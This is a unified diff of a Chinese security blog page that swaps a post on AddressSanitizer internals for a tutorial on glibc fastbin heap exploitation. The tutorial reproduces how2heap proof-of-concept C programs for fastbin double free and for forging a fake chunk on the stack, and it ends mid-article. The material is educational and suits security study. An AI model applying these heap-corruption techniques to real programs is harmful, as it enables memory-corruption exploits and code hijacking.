@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="LLVM,Sanitizer," />
+  <meta name="keywords" content="exploit,fastbin," />
 
 
 
@@ -96,33 +96,22 @@
 
 
 
-<meta name="description" content="AddressSanitizer简介AddressSanitizer是Google用于检测内存各种buffer overflow(Heap buffer overflow, Stack buffer overflow, Global buffer overflow)的一个非常有用的工具。该工具是一个LLVM的Pass，现已集成至llvm中，要是用它可以通过-fsanitizer=address选项">
-<meta name="keywords" content="LLVM,Sanitizer">
+<meta name="description" content="背景介绍  在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:  fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击   fastbin漏洞利用  具体的fastbin的介绍请">
+<meta name="keywords" content="exploit,fastbin">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AddressSanitizer算法及源码解析">
-<meta property="og:url" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/index.html">
+<meta property="og:title" content="linux堆内存漏洞利用之fastbin">
+<meta property="og:url" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/index.html">
 <meta property="og:site_name" content="PCB博客">
-<meta property="og:description" content="AddressSanitizer简介AddressSanitizer是Google用于检测内存各种buffer overflow(Heap buffer overflow, Stack buffer overflow, Global buffer overflow)的一个非常有用的工具。该工具是一个LLVM的Pass，现已集成至llvm中，要是用它可以通过-fsanitizer=address选项">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/RedZone.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/mapping.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/typicalMapping.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/runOnModule.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/instrument_global.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/posionGlobal_struct.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/poisonGlobal_runtimeStruct.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/instrumentGlobal_actural.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/register_unregisterGlobal.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/Register.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/unregisterGlobal.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/stack_instrument.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/instrumentMop.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/doInstrument.png">
-<meta property="og:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/hookFunction.png">
-<meta property="og:updated_time" content="2017-07-27T07:49:15.414Z">
+<meta property="og:description" content="背景介绍  在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:  fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击   fastbin漏洞利用  具体的fastbin的介绍请">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack_pic.png">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack.png">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/houseofspirit.png">
+<meta property="og:updated_time" content="2017-09-24T04:00:29.480Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="AddressSanitizer算法及源码解析">
-<meta name="twitter:description" content="AddressSanitizer简介AddressSanitizer是Google用于检测内存各种buffer overflow(Heap buffer overflow, Stack buffer overflow, Global buffer overflow)的一个非常有用的工具。该工具是一个LLVM的Pass，现已集成至llvm中，要是用它可以通过-fsanitizer=address选项">
-<meta name="twitter:image" content="http://bin2415.github.io/2017/07/26/AddressSanitizer/RedZone.png">
+<meta name="twitter:title" content="linux堆内存漏洞利用之fastbin">
+<meta name="twitter:description" content="背景介绍  在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:  fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击   fastbin漏洞利用  具体的fastbin的介绍请">
+<meta name="twitter:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png">
 
 <meta name="google-site-verification" content="6X0VEc7S4OCLuVOpAVhTrqQS6qCLzeJWET8siPhU0IE" />
 
@@ -153,13 +142,13 @@
 
 
 
-  <link rel="canonical" href="http://bin2415.github.io/2017/07/26/AddressSanitizer/"/>
+  <link rel="canonical" href="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/"/>
 
 
 
 
 
-  <title>AddressSanitizer算法及源码解析 | PCB博客</title>
+  <title>linux堆内存漏洞利用之fastbin | PCB博客</title>
 </head>
 
 
@@ -341,7 +330,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/07/26/AddressSanitizer/">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="binpang">
@@ -358,7 +347,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">AddressSanitizer算法及源码解析</h1>
+          <h1 class="post-title" itemprop="name headline">linux堆内存漏洞利用之fastbin</h1>
         
 
         <div class="post-meta">
@@ -370,8 +359,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-26T10:03:38+08:00">
-                2017-07-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-24T10:14:15+08:00">
+                2017-09-24
               </time>
             
 
@@ -393,8 +382,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/LLVM/" itemprop="url" rel="index">
-                    <span itemprop="name">LLVM</span>
+                  <a href="/categories/ptmalloc/" itemprop="url" rel="index">
+                    <span itemprop="name">ptmalloc</span>
                   </a>
                 </span>
 
@@ -411,7 +400,7 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a class="cloud-tie-join-count" href="/2017/07/26/AddressSanitizer/#comments" itemprop="discussionUrl">
+                <a class="cloud-tie-join-count" href="/2017/09/24/linux堆内存漏洞利用之fastbin/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count join-count" itemprop="commentCount"></span>
                 </a>
               </span>
@@ -420,7 +409,7 @@
 
           
           
-             <span id="/2017/07/26/AddressSanitizer/" class="leancloud_visitors" data-flag-title="AddressSanitizer算法及源码解析">
+             <span id="/2017/09/24/linux堆内存漏洞利用之fastbin/" class="leancloud_visitors" data-flag-title="linux堆内存漏洞利用之fastbin">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -448,45 +437,39 @@
       
 
       
-        <h2 id="AddressSanitizer简介"><a href="#AddressSanitizer简介" class="headerlink" title="AddressSanitizer简介"></a>AddressSanitizer简介</h2><p>AddressSanitizer是Google用于检测内存各种buffer overflow(Heap buffer overflow, Stack buffer overflow, Global buffer overflow)的一个非常有用的工具。该工具是一个LLVM的Pass，现已集成至llvm中，要是用它可以通过-fsanitizer=address选项使用它。AddressSanitizer的源码位于/lib/Transforms/Instrumentation/AddressSanitizer.cpp中，Runtime-library的源码在llvm的另一个项目compiler-rt的/lib/asan文件夹中。</p>
-<h2 id="AddressSanitizer算法"><a href="#AddressSanitizer算法" class="headerlink" title="AddressSanitizer算法"></a>AddressSanitizer算法</h2><p>具体的算法可以参考<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm" target="_blank" rel="external">WIKI</a>,在此对AddressSanitizer算法做一个简短的介绍。AddressSanitizer主要包括两部分：插桩(Instrumentation)和动态运行库(Run-time library)。插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。其实该算法的思路很简单，如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。具体的示意图如下图所示。</p>
-<p><img src="/2017/07/26/AddressSanitizer/RedZone.png" alt="RedZone"></p>
-<h3 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h3><p>AddressSanitizer保护的主要原理是对程序中的虚拟内存提供粗粒度的影子内存(没8个字节的内存对应一个字节的影子内存)，为了减少overhead，就采用了直接内存映射策略，所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问，如果0&lt;k&lt;7,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。具体的映射策略如下图所示。<br><img src="/2017/07/26/AddressSanitizer/mapping.png" alt="mapping图片"></p>
-<center> 图1： 虚拟地址映射图 </center>
-
-<p><img src="/2017/07/26/AddressSanitizer/typicalMapping.png" alt="typicalMapping"></p>
-<h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>为了防止buffer overflow，需要将原来分配的内存两边分配额外的内存Redzone，并将这两边的内存加锁，设为不能访问状态，这样可以有效的防止buffer overflow(但不能杜绝buffer overflow)。一下是在栈中插桩的一个例子。</p>
-<p>未插桩的代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">char</span> a[<span class="number">8</span>];</div><div class="line">  ...</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>插桩后的代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">char</span> redzone1[<span class="number">32</span>];  <span class="comment">// 32-byte aligned</span></div><div class="line">  <span class="keyword">char</span> a[<span class="number">8</span>];          <span class="comment">// 32-byte aligned</span></div><div class="line">  <span class="keyword">char</span> redzone2[<span class="number">24</span>]; </div><div class="line">  <span class="keyword">char</span> redzone3[<span class="number">32</span>];  <span class="comment">// 32-byte aligned</span></div><div class="line">  <span class="keyword">int</span>  *shadow_base = MemToShadow(redzone1);</div><div class="line">  shadow_base[<span class="number">0</span>] = <span class="number">0xffffffff</span>;  <span class="comment">// poison redzone1</span></div><div class="line">  shadow_base[<span class="number">1</span>] = <span class="number">0xffffff00</span>;  <span class="comment">// poison redzone2, unpoison 'a'</span></div><div class="line">  shadow_base[<span class="number">2</span>] = <span class="number">0xffffffff</span>;  <span class="comment">// poison redzone3</span></div><div class="line">  ...</div><div class="line">  shadow_base[<span class="number">0</span>] = shadow_base[<span class="number">1</span>] = shadow_base[<span class="number">2</span>] = <span class="number">0</span>; <span class="comment">// unpoison all</span></div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="动态运行库"><a href="#动态运行库" class="headerlink" title="动态运行库"></a>动态运行库</h3><p>在动态运行库中将malloc/free函数进行了替换。在malloc函数中额外的分配了Redzone区域的内存，将与Redzone区域对应的影子内存加锁，主要的内存区域对应的影子内存不加锁。</p>
-<p>free函数将所有分配的内存区域加锁，并放到了隔离区域的队列中(保证在一定的时间内不会再被malloc函数分配)。</p>
-<h2 id="AddressSanitizer源码分析"><a href="#AddressSanitizer源码分析" class="headerlink" title="AddressSanitizer源码分析"></a>AddressSanitizer源码分析</h2><p>AddressSanitizer主要有三种层面的变量：Stack Variable(局部变量)，Global Variable, Heap Variable。由于每种变量的生命周期（life time)不同，所以对不同种类的变量处理也是不同的。下面分别从Global Variable，Stack Variable，Heap Variable三个层次来分析AddressSanitizer源码的逻辑结构。</p>
-<h3 id="Global-Variable"><a href="#Global-Variable" class="headerlink" title="Global Variable"></a>Global Variable</h3><p>Global Variable存放在程序的数据段。在该算法的实现过程中，处理GlobalVariale的是AddressSanitizerModule类，该类继承自llvm的ModulePass，所以我们先看一下AddressSanitizerModule类的runOnModule(Module &amp;M)方法的处理过程，该过程首先进行一些初始化，然后我们可以看到对Global的插桩方法InstrumentGlobals()方法。</p>
-<p><img src="/2017/07/26/AddressSanitizer/runOnModule.png" alt="runOnMoudle"></p>
-<center> 图2： RunOnModule </center>
-
-<p>在InstrumentGlobals()方法中，主要是分成两步：首先，重新声明一个GlobalVariable，这个GlobalVariable包含以前的GlobalVariable和一个RedZone；然后，调用runtime-library将新声明的这个GlobalVariable的RedZone区域加锁。我们先来看第一步的具体实现，如图3所示。</p>
-<p><img src="/2017/07/26/AddressSanitizer/instrument_global.png" alt="instrumentGlobal"></p>
-<center> 图3： 生成包含RedZone的新的GlobalVariable </center>
-
-<p>下面，我们首先看一下一个Struct结构，该结构记录GlobalVariable存储的首地址，数据的大小，Redzone的大小，Module的名字等信息，便于在Runtime-library中使用。该结构在AddressSanitizerModule和runtime-library中都有相应的定义：</p>
-<p><img src="/2017/07/26/AddressSanitizer/posionGlobal_struct.png" alt="poisonGlobal"><br><img src="/2017/07/26/AddressSanitizer/poisonGlobal_runtimeStruct.png" alt="poisonGlobalRuntime"></p>
-<p>然后我们可以看到对GlobalVariable进行插桩来实现RedZone的Poison和整个GlobalVariable的Poison操作。</p>
-<p><img src="/2017/07/26/AddressSanitizer/instrumentGlobal_actural.png" alt="instrumentGlobal_actural"><br><img src="/2017/07/26/AddressSanitizer/register_unregisterGlobal.png" alt="register_unregisterGlobal">  </p>
-<p>具体的Poison RedZone和Poison GlobalVariable的实现在Runtime-library中：<br><img src="/2017/07/26/AddressSanitizer/Register.png" alt="RegisterGlobal"><br><img src="/2017/07/26/AddressSanitizer/unregisterGlobal.png" alt="UnRegisterGlobal"></p>
-<h3 id="Stack-Variable"><a href="#Stack-Variable" class="headerlink" title="Stack Variable"></a>Stack Variable</h3><p>Stack Variable保存在栈区，在栈中的数据我们需要控制好变量的声明周期(lifetime),当调用一个函数时，会开辟一个栈，栈中的数据会有相应的redzone和shadow memory，并将redzone的shadow memory Poison，当函数结束（正常返回，异常），栈被销毁，需要将数据和redzone清空，其相应的shadow memory也要UnPoison掉。</p>
-<p>对于Stack Variable，AddressSanitizer算法中实现了AddressSanitizer类，该类是继承了llvm的FunctionPass，该Pass能够处理每一个函数，在处理每个函数的时候，处理每一个load，store等能够访问内存的指令，在这些指令执行前进行插桩，看其访问的内存是不是被poison。</p>
-<p>下面我们主要看一下AddressSanitizer::runOnFunction(Module &amp;M)函数中主要的插桩过程。</p>
-<p><img src="/2017/07/26/AddressSanitizer/stack_instrument.png" alt="stackInstrument"></p>
-<p>在每次访问内存时，都会查看影子内存的值，看其是否是0，如果是0则表示都能访问具体的插桩在instrumentMop函数中，</p>
-<p><img src="/2017/07/26/AddressSanitizer/instrumentMop.png" alt="instrumentMop"></p>
-<p>其中具体的处理过程在instrumentAddress函数中：</p>
-<p><img src="/2017/07/26/AddressSanitizer/doInstrument.png" alt="instrumentAddress"></p>
-<h3 id="Heap-Variable"><a href="#Heap-Variable" class="headerlink" title="Heap Variable"></a>Heap Variable</h3><p>Heap Variable保存在堆区，其分配的函数是malloc函数，该部分的主要代码在runtime-library中，该库中主要是先将malloc的库函数hook住，然后自己定义malloc函数，定义分配策略。</p>
-<p><img src="/2017/07/26/AddressSanitizer/hookFunction.png" alt="hookFunction"></p>
-<p>具体的分配策略定义在compiler-rt/lib/asan/asan-allocator.cc文件中，感兴趣可以看一下。</p>
+        <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>  在<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="external">前一节</a>主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:</p>
+<ul>
+<li>fastbin的攻击</li>
+<li>smallbin的攻击</li>
+<li>largebin的攻击</li>
+<li>unsorted bin的攻击</li>
+<li><p>top chunk的攻击</p>
+<p>本文主要介绍fastbin的攻击</p>
+</li>
+</ul>
+<h2 id="fastbin漏洞利用"><a href="#fastbin漏洞利用" class="headerlink" title="fastbin漏洞利用"></a>fastbin漏洞利用</h2><p>  具体的fastbin的介绍请参考<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="external">前一节</a>和 <a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.36f39d7ebNe83t&amp;articleid=334" target="_blank" rel="external">Linux堆内存管理深入分析(下)</a>，在本节中主要结合<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>的代码来介绍一下具体的漏洞利用思路。</p>
+<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p>  double free的意思就是一个malloc的指针被释放了两次，由于针对fastbin的free处理只是对double free做了简单的判断，所以很容易绕过它的double free判断。free() fastbin时的判断如下所示：</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></div><div class="line">	   (i.e., double free).  */</div><div class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</div><div class="line">	  &#123;</div><div class="line">	    errstr = <span class="string">"double free or corruption (fasttop)"</span>;</div><div class="line">	    <span class="keyword">goto</span> errout;</div><div class="line">	  &#125;</div></pre></td></tr></table></figure>
+<p>  其中old指针为fast bin的头指针，即此处只是判断fastbin的头指针和p指针是否一致。所以fastbin double free的攻击思路就是我们只要保证要double free的chunk不在fastbin的头部即可。</p>
+<p>  具体的攻击示例如下：</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</div><div class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</div><div class="line">	<span class="comment">// free(a);</span></div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</div><div class="line">	<span class="built_in">free</span>(b);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>  在此示例中，首先申请三个大小为8的int数组，然后先free(a),由于fast bin是一个单链表，在插入和删除的时候只在头部进行，所以此时将a的chunk放入了fast bin的头部，随后又free(b),此时fast bin的头部为chunk b，随后又free(a)，此时由于fast bin的头部为chunk b，所以在free()的时候进行判断old == p不会抛出错误进而绕过这个简单的判断处理。再进行malloc的时候首先会从fast bin的头部进行删除，则接下来第一个分配的chunk为chunk A，第二个分配的为chunk B，接下来会再次分配chunk A。</p>
+<p>  绕过示例结果如下所示:</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png" alt="fast bin dup"></p>
+<h3 id="fast-bin-double-free-in-stack"><a href="#fast-bin-double-free-in-stack" class="headerlink" title="fast bin double free in stack"></a>fast bin double free in stack</h3><p>  上面的那个例子只是简单的一个double free，这个例子是利用double free漏洞在栈中构造了一个fake chunk。<br>  其具体的示例如下所示:</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></div><div class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</div><div class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</div><div class="line">	<span class="comment">// free(a);</span></div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</div><div class="line">	<span class="built_in">free</span>(b);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. "</span></div><div class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, d);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p ].\n"</span>, a);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></div><div class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></div><div class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></div><div class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</div><div class="line">	stack_var = <span class="number">0x20</span>;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</div><div class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>  在以上代码中，当d被malloc的时候，此时还有对应的chunk a在fast bin中，所以如果对d进行修改，也会影响到chunk a的值。我们知道malloced chunk和freed chunk对应的结构不一样，对与同一个chunk A来说，有两种形式–对于d来说，其对应的是malloced chunk，而其在fast bin中还有一个freed chunk。<br>  其示例如图所示：</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack_pic.png" alt="fast bin stack pin"></p>
+<p>  可以看到<em>d(payload开始地址)正好对应了chunk A的fd指针，将 </em>d的值赋值为&amp;stack_var-8,则 stack_var=0x20即为在栈中伪造的chunk的size=0x20，与此fast bin的大小对应，此时chunk A的fd指向了在栈中伪造的chunk，此时就将伪造的chunk放入了fastbin链表中。进而malloc可以返回伪造的指针。</p>
+<p>  该示例代码的运行结果如下所示：</p>
